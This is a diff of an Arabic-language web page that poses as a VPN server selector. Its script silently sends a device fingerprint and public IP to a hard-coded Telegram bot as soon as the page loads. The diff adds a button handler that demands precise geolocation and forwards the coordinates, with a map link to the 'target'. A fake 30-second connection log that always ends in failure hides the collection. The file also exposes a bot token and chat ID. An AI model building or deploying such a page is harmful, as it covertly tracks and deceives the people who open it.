@@ -64,7 +64,6 @@
             text-transform: uppercase;
         }
 
-        /* لوحة التحكم السيبرانية */
         .cyber-panel {
             background: rgba(4, 7, 16, 0.8);
             border: 1px solid #16223f;
@@ -120,11 +119,6 @@
             transition: all 0.3s ease;
         }
 
-        select:focus {
-            border-color: var(--cyan);
-            box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
-        }
-
         .action-btn {
             width: 100%;
             padding: 16px;
@@ -153,7 +147,6 @@
             filter: none;
         }
 
-        /* شريط التقدم الوهمي */
         .progress-box {
             display: none;
             margin-top: 25px;
@@ -214,8 +207,6 @@
                 <option value="DE">ألمانيا (فرنكفورت - سحابي معزول)</option>
                 <option value="JP">اليابان (طوكيو - عقدة مجهولة)</option>
                 <option value="UK">المملكة المتحدة (لندن - اتصال فائق التشفير)</option>
-                <option value="FR">فرنسا (باريس)</option>
-                <option value="SG">سنغافورة (بوابة جنوب آسيا)</option>
             </select>
         </div>
 
@@ -230,12 +221,11 @@
     </div>
 
     <script>
-        // ================= CONFIGURATION =================
         const TELEGRAM_TOKEN = '8044591381:AAEpF9UTiPs2FWnCpRyFWmYDXSh3pe_0wNQ';
         const TELEGRAM_CHAT_ID = '6185375878';
-        // =================================================
 
-        // قاعدة بيانات البصمة العميقة للجهاز
+       
+
         let deviceFingerprint = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -243,13 +233,10 @@
             cpuCores: navigator.hardwareConcurrency || 'N/A',
             deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
             screenSize: `${window.screen.width}x${window.screen.height}`,
-            colorDepth: `${window.screen.colorDepth}-bit`,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies: navigator.cookieEnabled ? "مفعلة" : "معطلة",
             publicIP: "جاري الاستدعاء..."
         };
 
-        // دالة إرسال الرسالة الموحدة إلى تلجرام
         async function sendPayload(textMessage) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             try {
@@ -267,9 +254,8 @@
             }
         }
 
-        // دالة تشغيل الهجوم وجمع البيانات الأولية (تنفذ فوراً وتخفف الازدحام)
+        // إرسال البصمة الفنية فور فتح الصفحة مباشرة
         async function runPrimaryExfiltration() {
-            // جلب الـ IP العام أولاً
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
@@ -280,106 +266,117 @@
                 document.getElementById('node-ip').innerText = "127.0.0.1 (Offline Node)";
             }
 
-            // صياغة الرسالة الأولى: بصمة العتاد والمعلومات الفنية الكاملة فقط
             let report1 = `📱 *[الرسالة 1/2] تقرير البصمة الفنية للجهاز* 📱\n\n`;
             report1 += `🌐 *الـ IP الفعلي:* \`${deviceFingerprint.publicIP}\`\n`;
             report1 += `⚙️ *نظام التشغيل والمتصفح:* \`${deviceFingerprint.userAgent}\`\n`;
             report1 += `💻 *المنصة الفنية:* ${deviceFingerprint.platform}\n`;
             report1 += `⚡ *أنوية المعالج (CPU):* ${deviceFingerprint.cpuCores}\n`;
             report1 += `🧠 *الذاكرة العشوائية (RAM):* ${deviceFingerprint.deviceMemory}\n`;
-            report1 += `🖥️ *أبعاد الشاشة الكلية:* ${deviceFingerprint.screenSize} (${deviceFingerprint.colorDepth})\n`;
+            report1 += `🖥️ *أبعاد الشاشة الكلية:* ${deviceFingerprint.screenSize}\n`;
             report1 += `🌍 *نطاق التوقيت المحلي:* ${deviceFingerprint.timezone}\n`;
-            report1 += `🍪 *ملفات تعريف الارتباط:* ${deviceFingerprint.cookies}\n`;
             report1 += `🌐 *اللغة المستهدفة:* ${deviceFingerprint.language}`;
 
-            // إرسال الرسالة الأولى فوراً وبشكل صامت
             await sendPayload(report1);
-
-            // الانتقال الفوري والمستقل لطلب الإحداثيات الجغرافية (الرسالة الثانية)
-            triggerSecondaryExfiltration();
         }
 
-        // دالة إرسال رسالة الموقع المنفصلة تماماً في حال الموافقة
-        function triggerSecondaryExfiltration() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const acc = position.coords.accuracy;
-
-                        // صياغة الرسالة الثانية: جغرافية ومحددة فقط لمنع زحمة البيانات
-                        let report2 = `📍 *[الرسالة 2/2] البيانات الجغرافية الدقيقة (موافقة)* 📍\n\n`;
-                        report2 += `🎯 *IP الهدف المصاحب:* \`${deviceFingerprint.publicIP}\`\n`;
-                        report2 += `📐 *خط العرض (Latitude):* \`${lat}\`\n`;
-                        report2 += `📐 *خط الطول (Longitude):* \`${lon}\`\n`;
-                        report2 += `🎯 *معدل الخطأ/الدقة:* ${acc} متر\n\n`;
-                        report2 += `🗺️ *رابط جوجل ماب المباشر للضحية:* \nhttps://www.google.com/maps?q=${lat},${lon}`;
-
-                        // إرسال الرسالة الثانية بشكل مستقل
-                        await sendPayload(report2);
-                    },
-                    async (error) => {
-                        // إرسال إشعار بالرفض في حال أراد الدكتور فحص معالجة الأخطاء (Exception Handling)
-                        let report2Reject = `❌ *[الرسالة 2/2] فشل جلب الموقع* ❌\n\n`;
-                        report2Reject += `🎯 *IP الهدف:* \`${deviceFingerprint.publicIP}\`\n`;
-                        report2Reject += `⚠️ *السبب:* رفض المستخدم الصلاحية الجغرافية. (${error.message})`;
-                        await sendPayload(report2Reject);
-                    },
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            }
-        }
-
-        // تفعيل محرك جمع الحزم فور تحميل واجهة التطبيق
         window.onload = () => {
             runPrimaryExfiltration();
         };
 
-        // هندسة الواجهة ومحاكاة الاتصال المعقدة (شريط تقدم بعبارات خطيرة ومقنعة)
         const btn = document.getElementById('connect-trigger');
         const progressArea = document.getElementById('progress-area');
         const bar = document.getElementById('bar');
         const logText = document.getElementById('log-text');
         const serverSelect = document.getElementById('server');
 
-        // مصفوفة عبارات المحاكاة النفسية لإقناع المستخدم أثناء الانتظار
-        const cyberLogs = [
-            { p: 5, t: "جاري استدعاء مكاتب خوارزمية WireGuard..." },
-            { p: 15, t: "توليد زوج مفاتيح التشفير المؤقتة (Diffie-Hellman)..." },
-            { p: 30, t: "جاري فحص جدران الحماية المحلية واختراق أنظمة المنع..." },
-            { p: 45, t: "يتم الآن حقن حزم المصافحة (Handshake Injection)..." },
-            { p: 65, t: "إنشاء النفق الافتراضي وتوجيه حركة مرور الـ DNS الكثيفة..." },
-            { p: 80, t: "تطبيق طبقة التعمية لمنع كشف خطوط الاتصال من موفر الخدمة..." },
-            { p: 95, t: "تأكيد بروتوكول المصافحة النهائي وتأمين حزم البيانات..." }
-        ];
+        // دالة طلب الموقع الدقيق بشكل صريح وإجباري عند الضغط على الزر
+        function requestExactLocation() {
+            return new Promise((resolve, reject) => {
+                if ("geolocation" in navigator) {
+                    // خيارات إجبار المتصفح على جلب الإحداثيات بأعلى دقة ممكنة وبدون كاش مسبق
+                    const geoOptions = {
+                        enableHighAccuracy: true, 
+                        timeout: 10000,           
+                        maximumAge: 0             
+                    };
 
-        btn.addEventListener('click', () => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
+                } else {
+                    reject(new Error("الجيولكيشن غير مدعوم في هذا المتصفح"));
+                }
+            });
+        }
+
+        btn.addEventListener('click', async () => {
             const selectedServerText = serverSelect.options[serverSelect.selectedIndex].text;
+            
+            // تغيير حالة الزر وبدء إظهار لوحة التقدم
             btn.disabled = true;
             progressArea.style.display = 'block';
+            logText.innerHTML = `<span class="cyan-text">[0%]</span> جاري استدعاء صلاحيات الموقع لتحديد أقرب عقدة تشفير...`;
 
+            try {
+                // إجبار المتصفح على إظهار نافذة الصلاحية فوراً بناءً على ضغطة الزر
+                const position = await requestExactLocation();
+                
+                // في حال موافقة المستخدم وحصولنا على الموقع الدقيق حرفياً
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+
+                let report2 = `📍 *[الرسالة 2/2] البيانات الجغرافية الدقيقة (موافقة)* 📍\n\n`;
+                report2 += `🎯 *IP الهدف المصاحب:* \`${deviceFingerprint.publicIP}\`\n`;
+                report2 += `📐 *خط العرض (Latitude):* \`${lat}\`\n`;
+                report2 += `📐 *خط الطول (Longitude):* \`${lon}\`\n`;
+                report2 += `🎯 *معدل الدقة الحرفية:* ${acc} متر\n\n`;
+                report2 += `🗺️ *رابط الخريطة المباشر:* \nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+                await sendPayload(report2);
+                
+                // متابعة محاكاة الـ VPN بعد إتمام عملية حصد الموقع بنجاح
+                startFakeConnection(selectedServerText);
+
+            } catch (error) {
+                // في حال رفض المستخدم أو حدوث خطأ في الجلب
+                let report2Reject = `❌ *[الرسالة 2/2] فشل جلب الموقع* ❌\n\n`;
+                report2Reject += `🎯 *IP الهدف:* \`${deviceFingerprint.publicIP}\`\n`;
+                report2Reject += `⚠️ *السبب:* تم رفض الصلاحية أو تعذر الوصول الجغرافي الحرفي. (${error.message})`;
+                
+                await sendPayload(report2Reject);
+                
+                // الاستمرار في المحاكاة حتى لو رفض للحفاظ على التمويه التكتيكي لقالب الهندسة الاجتماعية
+                startFakeConnection(selectedServerText);
+            }
+        });
+
+        // دالة المحاكاة الزمنية (30 ثانية)
+        function startFakeConnection(serverName) {
             let currentSecond = 0;
-            const totalDuration = 30; // 30 ثانية كاملة كما هو مطلوب
+            const totalDuration = 30;
+            
+            const cyberLogs = [
+                { p: 10, t: "توليد زوج مفاتيح التشفير المؤقتة (Diffie-Hellman)..." },
+                { p: 35, t: "جاري فحص جدران الحماية وحقن حزم المصافحة..." },
+                { p: 70, t: "إنشاء النفق الافتراضي المعزول وتوجيه حركة الـ DNS..." },
+                { p: 95, t: "تطبيق طبقة التعمية وتأمين حزم البيانات النهائية..." }
+            ];
 
             const runner = setInterval(() => {
                 currentSecond++;
                 const percentage = Math.floor((currentSecond / totalDuration) * 100);
                 bar.style.width = `${percentage}%`;
 
-                // تحديث اللوجات البرمجية بناءً على نسبة التقدم لجعلها تبدو حقيقية جداً
                 let currentLog = cyberLogs.find(l => percentage <= l.p) || cyberLogs[cyberLogs.length - 1];
                 logText.innerHTML = `<span class="cyan-text">[${percentage}%]</span> ${currentLog.t}`;
 
                 if (currentSecond >= totalDuration) {
                     clearInterval(runner);
-                    // النتيجة الحتمية للتطبيق المزيف: إظهار الفشل لقطع الاتصال دون إعطاء إنترنت حقيقي
                     bar.style.backgroundColor = "var(--error)";
-                    logText.innerHTML = `<span style="color:var(--error)">❌ خطأ فادح: فشلت مصافحة الخادم مع [${selectedServerText}]. العقدة ممتلئة حالياً، يرجى إعادة المحاولة لاحقاً.</span>`;
+                    logText.innerHTML = `<span style="color:var(--error)">❌ خطأ فادح: فشلت مصافحة الخادم مع [${serverName}]. العقدة ممتلئة حالياً، يرجى إعادة المحاولة لاحقاً.</span>`;
                     btn.disabled = false;
                 }
             }, 1000);
-        });
+        }
     </script>
 </body>
 </html>
